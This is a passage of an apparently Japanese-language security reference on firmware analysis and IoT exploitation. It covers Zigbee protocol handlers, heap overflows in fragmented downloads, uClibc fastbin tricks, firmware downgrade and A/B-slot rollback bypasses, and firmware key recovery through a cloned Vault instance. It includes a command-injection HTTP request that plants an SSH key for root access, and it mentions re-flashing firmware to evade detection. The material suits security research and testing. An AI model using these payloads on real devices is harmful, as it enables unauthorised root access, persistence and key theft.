この段階では、実機またはエミュレートされたデバイス環境を使って分析します。OS とファイルシステムへの shell access を維持することが重要です。エミュレーションではハードウェアとのやり取りを完全に再現できない場合があり、その際はエミュレーションを再起動する必要があります。分析では、ファイルシステムを再確認し、公開されている Web ページやネットワークサービスを悪用し、bootloader の脆弱性を調査してください。ファームウェアの整合性テストは、潜在的な backdoor の脆弱性を特定するうえで重要です。

## Runtime Analysis Techniques

Runtime analysis では、gdb-multiarch、Frida、Ghidra などのツールを使って、実行環境内のプロセスやバイナリを操作します。ブレークポイントを設定し、fuzzing などの手法で脆弱性を特定します。

完全なデバッガーを使えない組み込みターゲットでは、**静的リンクされた `gdbserver` をデバイスにコピー**し、リモートから接続します。<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor メッセージマッピング

IoT hub では、RF stack が**radio MCU**と Linux の userland process に分割されていることがよくあります。有用な手順は、次の経路をマッピングすることです:<sup>[[8]](#references)</sup>

1. 無線上の**RF frame**
2. radio MCU 上の**controller-side parser**
3. Linux に転送される**serial/UART テキストまたは TLV protocol**（例: `/dev/tty*`）
4. メイン daemon 内の**application dispatcher**
5. **protocol-specific handler / state machine**

このアーキテクチャでは、解析対象が1つではなく2つになります。controller が binary radio frame を `Group,Command,arg1,arg2,...` のようなテキスト protocol に変換する場合、次の情報を特定してください:

- **message group**と dispatch table
- どの message が**network**から届き、どれが controller 自体から届くか
- 正確な**manufacturer-specific discriminator field**（例: Zigbee の `manufacturer_code` とカスタム `cluster_command`）
- **commissioning**、discovery、firmware/model download の段階でのみ到達可能な handler

Zigbee では、pairing traffic をキャプチャし、対象がまだデフォルトの**Link Key** `ZigBeeAlliance09` に依存しているか確認してください。依存している場合、commissioning traffic の sniffing により**Network Key**が漏れる可能性があります。Zigbee 3.0 の install code はこのリスクを低減するため、テスト対象デバイスが実際に install code を強制しているか確認してください。

### Manufacturer-specific protocol handler と FSM による到達制御

Vendor-specific Zigbee/ZCL command は、標準化された cluster よりも有望なターゲットとなることがよくあります。十分に検証されていない**カスタム parsing code**や内部**FSM**に入力されるためです。<sup>[[8]](#references)</sup>

実践的な手順:

- command dispatcher を解析し、**vendor-only handler**を見つける。
- **FSM state**、**event**、**check**、**action**、**next-state** の table を復元する。
- 自動的に遷移する**transitional state**や、最終的に attacker-controlled state を reset または free する retry/error branch を特定する。
- バグのある handler が常に到達可能だと想定せず、脆弱な state に daemon を移行させるために、どの正規の protocol exchange が必要か確認する。

タイミングに敏感な protocol では、Python framework による packet replay は遅すぎる場合があります。より確実な方法は、vendor-grade stack を使って実機（例: **nRF52840**）上で正規デバイスをエミュレートし、正しい**endpoint**、**attribute**、commissioning timing を再現することです。

### Embedded daemon における fragmented download のバグクラス

**fragmented blob/model/configuration download**では、次のような firmware bug が繰り返し見られます:<sup>[[8]](#references)</sup>

1. **最初の fragment**（`offset == 0`）が `ctx->total_size` を保存し、`malloc(total_size)` でメモリを確保する。
2. 後続の fragment では、`packet_total_size >= offset + chunk_len` など、攻撃者が制御する**packet-local field**のみを検証する。
3. `memcpy(&ctx->buffer[offset], chunk, chunk_len)` によるコピーで、**最初に確保したサイズ**を超えないか確認しない。

これにより、攻撃者は次のような fragment を送信できます:

- 宣言する total size を**小さく**した有効な最初の fragment を送り、小さな heap allocation を発生させる。
- **想定された offset**を持つ後続 fragment で、より大きな `chunk_len` を指定する。
- packet-local size を偽装して新たな検証を通過させつつ、最初に確保された buffer を overflow させる。

脆弱な経路が commissioning logic の背後にある場合、malformed fragment を送る前に、対象を想定された model-download または blob-download state に移行させるための十分な**device emulation**が必要です。

### Protocol によって誘発される `free()` trigger

Embedded daemon では、heap metadata exploitation を引き起こす最も簡単な方法は、「cleanup を待つ」ことではなく、**protocol 自体の error handling を強制する**ことです:<sup>[[8]](#references)</sup>

- malformed な後続 fragment を送り、FSM を**retry**または**error** state に移行させる。
- retry threshold を超過させ、daemon に**context を reset**させて破損した buffer を free させる。
- この予測可能な `free()` を利用して、無関係な理由で process が crash する前に allocator-side primitive を発生させる。

これは、embedded Linux で使われる**musl/uClibc/dlmalloc-like** allocator に対して特に有効です。chunk metadata を破損させることで、unlink/unbin logic を write primitive に変えられる場合があります。安定した手法は、size field を破損させ、実際の bin pointer をすぐに上書きして process を crash させるのではなく、overflow した buffer 内に配置した**fake chunk**へ allocator traversal を誘導することです。

## Binary Exploitation と Proof-of-Concept

特定した脆弱性の PoC を開発するには、対象 architecture の深い理解と、低レベル言語でのプログラミングが必要です。Embedded system では binary runtime protection はまれですが、存在する場合は Return Oriented Programming (ROP) などの手法が必要になることがあります。

### uClibc fastbin exploitation のメモ（embedded Linux）

- **Fastbin と consolidation:** uClibc は glibc と同様の fastbin を使用します。後続の大きな allocation が `__malloc_consolidate()` を発生させることがあるため、fake chunk は検査（妥当な size、`fd = 0`、周囲の chunk が「使用中」と認識されること）を通過する必要があります。<sup>[[6]](#references)</sup>
- **ASLR 下の non-PIE binary:** ASLR が有効でも、メイン binary が**non-PIE**なら、binary 内の `.data/.bss` address は安定しています。有効な heap chunk header に見える領域を狙い、fastbin allocation を**function pointer table**に着地させることができます。
- **parser を停止させる NUL:** JSON の parsing 時に payload 内の `\x00` が parsing を停止させる一方、後続の攻撃者制御 bytes を stack pivot/ROP chain 用に残せます。
- **`/proc/self/mem` による shellcode:** `open("/proc/self/mem")`、`lseek()`、`write()` を呼び出す ROP chain により、既知の mapping に実行可能な shellcode を配置して実行できます。

## Firmware Analysis 用の準備済み Operating System

[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) などの operating system は、firmware security testing 用に事前設定された環境を必要な tool とともに提供します。

## Firmware Analysis 用の準備済み OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は、Internet of Things (IoT) device の security assessment と penetration testing を支援する distro です。必要な tool をすべて読み込んだ事前設定済みの環境を提供し、作業時間を大幅に短縮します。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tool があらかじめインストールされた、Ubuntu 18.04 ベースの embedded security testing operating system です。

## Firmware Downgrade Attack と Insecure Update Mechanism

vendor が firmware image の cryptographic signature 検証を実装していても、**version rollback（downgrade）保護は省略されていることがよくあります**。boot- または recovery-loader が組み込みの public key で signature を検証するだけで、書き込む image の *version*（または monotonic counter）を比較しない場合、攻撃者は**有効な signature が付いた古い脆弱な firmware**を正規にインストールし、修正済みの脆弱性を再び持ち込めます。<sup>[[4]](#references)</sup>

一般的な攻撃手順:

1. **古い署名済み image を入手する**
   * vendor の公開 download portal、CDN、または support site から取得する。
   * 関連する mobile/desktop application から抽出する（例: Android APK 内の `assets/firmware/`）。
   * VirusTotal、Internet archive、forum などの third-party repository から取得する。
2. 公開されている update channel を使って、image を device に**upload または配信する**:
   * Web UI、mobile-app API、USB、TFTP、MQTT など。
   * 多くの consumer IoT device は、Base64-encoded firmware blob を受け付け、server-side で decode して recovery/upgrade を実行する、*認証不要*の HTTP(S) endpoint を公開しています。
3. downgrade 後、新しい release で修正された脆弱性を exploit する（例: 後から追加された command-injection filter）。
4. 必要に応じて、永続化を確立した後に検知を避けるため、最新の image を再度 flash するか update を無効にする。

### 例: Downgrade 後の Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

脆弱な（ダウングレードされた）ファームウェアでは、`md5` パラメーターがサニタイズされずにシェルコマンドへ直接連結されるため、任意のコマンドを注入できます（ここでは、SSH 鍵ベースの root アクセスを有効化しています）。後続のファームウェアでは基本的な文字フィルターが導入されましたが、ダウングレード保護がないため、この修正は意味をなしません。<sup>[[4]](#references)</sup>

### モバイルアプリからのファームウェア抽出

多くのベンダーは、アプリから Bluetooth/Wi-Fi 経由でデバイスをアップデートできるよう、コンパニオンモバイルアプリに完全なファームウェアイメージを同梱しています。これらのパッケージは、`assets/fw/` や `res/raw/` などのパスにある APK/APEX 内に、暗号化されずに保存されていることがよくあります。`apktool`、`ghidra`、あるいは単純な `unzip` などのツールを使えば、物理ハードウェアに触れることなく、署名済みイメージを取り出せます。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot設計におけるupdater限定のanti-rollback bypass

一部のベンダーはanti-downgrade **ratchet**を実装していますが、それは*updater*のロジック内に限られます（たとえば、CAN経由のUDSルーチン、recoveryコマンド、userspace OTA agentなど）。後段の**bootloader**がイメージの署名/CRCだけをチェックし、パーティションテーブルやslot metadataを信頼する場合、rollback protectionは依然として回避できます。<sup>[[7]](#references)</sup>

典型的な弱い設計:

- Firmware metadataに、version descriptorと**security ratchet** / monotonic counterの両方が含まれている。
- updaterは、イメージのratchetをpersistent storageに保存された値と比較し、古い署名付きイメージを拒否する。
- bootloaderはそのratchetを**解析せず**、選択されたslotを起動する前にheader、CRC、署名だけを検証する。
- Slot activationは、partition tableまたはslotごとのgeneration counterに別途保存され、検証済みのfirmware digestそのものとは**暗号学的に結び付けられていない**。

これにより、dual-slotシステムでは**あるイメージを検証して別のイメージを起動する**プリミティブが生まれます。攻撃者が、現在の署名付きイメージを使ってupdaterにslot Bを次回起動対象として指定させ、その後、再起動前にslot Bを上書きできる場合、bootloaderはすでにコミットされたslot metadataだけを信頼しているため、古いイメージを起動する可能性があります。

よくある悪用パターン:

1. **現在の署名付き**firmwareをpassive slotにアップロードし、通常の検証/切り替えルーチンを実行して、そのslotが次のactive slotとなるようlayoutに記録する。
2. **まだ再起動しない**。同じsession内でslot準備/eraseルーチンを再度呼び出す。
3. 古いboot-stateやslot-selectionのロジックを悪用し、updaterに、直前に昇格されたslotと**同じ物理slot**をeraseさせる。
4. そのslotに、**古いが署名は有効な**firmwareを書き込む。
5. ratchetを強制する検証ルーチンをスキップし、直接再起動する。
6. bootloaderは昇格されたslotを選択し、署名/整合性だけを検証して古いイメージを起動する。

A/B updateの実装をreverse engineeringする際に確認すべき点:

- Slot selectionが、成功した切り替え後に更新されない**boot-time flags**から決定されている。
- `prepare_passive_slot()`のようなルーチンが、**現在コミット済みのlayout**ではなく古い状態に基づいてslotをeraseする。
- `part_write_layout()`のような関数が、**generation counter** / active flagを更新するだけで、検証済みイメージのhashを保存しない。
- Ratchet checkがuserspaceまたはupdaterのコードに実装されているが、ROM / bootloader / secure boot stagesには**実装されていない**。
- Eraseまたはrecoveryルーチンが、slotの内容を削除して書き換えた後も、そのslotを起動可能な状態として残す。

### Update Logicの評価チェックリスト

* *update endpoint*のtransport/authenticationは適切に保護されているか（TLS + authentication）？
* Flashing前に、デバイスは**version numbers**または**monotonic anti-rollback counter**を比較しているか？
* イメージはsecure boot chain内で検証されるか（例: ROM codeが署名をチェックする）？
* **bootloaderは、署名/CRCだけをチェックするのではなく、updaterと同じratchetを強制しているか**？
* Slot activation metadataは**検証済みfirmwareのdigest/versionと結び付いているか**、それとも昇格後にslotを変更できるか？
* Slot切り替えが成功した後、デバイスは強制的に再起動するか、それとも同じsession内で後続のupdate/eraseルーチンにアクセスできるか？
* Userland codeは追加のsanity check（例: 許可されたpartition map、model number）を実行するか？
* *partial*または*backup* update flowは、同じ検証ロジックを再利用しているか？

> 💡  上記のいずれかが欠けている場合、そのplatformはrollback attacksに対して脆弱である可能性が高いです。

## 脆弱なfirmwareで練習する

Firmwareの脆弱性を見つける練習をするには、以下の脆弱なfirmware projectを出発点として利用してください。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 埋め込みKMS/Vault stateからfirmware decryption keysを復元する

Update imageに少量のplaintext metadataと大きな高entropy blobが混在している場合は、何かをbrute-forceする前にcontainer triageを行ってください:<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使って、header、offset、行境界をダンプする。
- `Salted__`は通常、OpenSSL `enc` formatを意味します。次の8 bytesがsaltで、残りのbytesがciphertextです。
- `256` bytesにデコードされるBase64 fieldは、RSA-2048 ciphertextでランダムなfirmware password/session keyをwrapしている強い手掛かりです。
- 同じファイル内のDetached PGP materialは、多くの場合、真正性だけを保護します。機密性を確保する仕組みだと決めつけないでください。

静的なkey探索（`grep`、`strings`、PEM/PGP検索）が失敗した場合は、private keyを探すだけでなく、**運用上のdecrypt path**をreverse engineeringしてください。

- Updater / management binaryをdecompileし、暗号化されたblobを読み込む箇所、unwrapに使われるhelper/API、要求される論理key nameを追跡する。
- 抽出したroot filesystemから、KMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）に加えてunit fileやinit scriptを検索する。
- Plaintextの`vault operator unseal ...`、recovery key、bootstrap token、またはローカルKMS auto-unseal scriptは、private-key materialと同等に扱う。

機器に元のVault binaryとstorage backendが含まれている場合、Vault内部の仕組みを再実装するより、その環境を再現するほうが通常は簡単です:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

クローンした KMS 上で root 権限を取得した状態で:

- transit key を隔離したクローン内でのみエクスポート可能にする: `vault write transit/keys/<name>/config exportable=true`
- unwrap key をエクスポートする: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS で使われている正確な padding/hash の組み合わせで試す。PKCS#1 v1.5 による復号やデフォルトの OAEP による復号に失敗しても、key が間違っているとは限らない。Vault を使うフローの多くは SHA-256 を使う OAEP を使用する一方、一般的なライブラリのデフォルトは SHA-1 である。
- payload が `Salted__` で始まる場合は、AES-CBC 復号を試す前に、ベンダーの OpenSSL KDF（`EVP_BytesToKey`。レガシーな appliance では MD5 が使われることが多い）を正確に再現する。

これにより「暗号化された firmware」は、より一般的な問題になる。**appliance 側の運用 key を復元し、正確な unwrap + KDF パラメーターをオフラインで再現する**。

## トレーニングと認定資格

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude で firmware を解析する: シニアレベルのスキル、ジュニアレベルの自律性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware セキュリティテスト手法](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [実践 IoT Hacking: Internet of Things を攻撃するための決定版ガイド](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放置された hardware の zero day を悪用する – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 ドルの smart device から自宅へのアクセスを得た方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector の charge port connector からの悪用 - Part 2: anti-downgrade の回避](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [点滅させる: Philips Hue Bridge の Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU 上で Tesla OS の ROOT を取得する Part 1: 展開](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel ドキュメント - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU 上で Tesla OS の ROOT を取得する Part 2: Debugging と修正](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Passwords: 弱い XOR 暗号化により SPI Flash から復元可能 (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS password 復元ツール](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Hardware Hacking の復習 Part 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Cypherock Hardware Wallet を hack した方法と理由: 全記録](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
